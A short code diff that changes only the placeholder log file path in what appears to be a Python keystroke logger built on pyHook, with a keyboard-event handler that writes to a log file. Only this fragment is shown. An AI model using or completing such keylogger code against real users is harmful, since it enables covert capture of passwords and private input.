@@ -1,6 +1,6 @@
 import pyHook, pythoncom, sys, logging
 
-file_log = "File directory/text file"
+file_log = "Path and file name.txt to be saved"
 
 def OnKeyboardEvent(event):
 	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
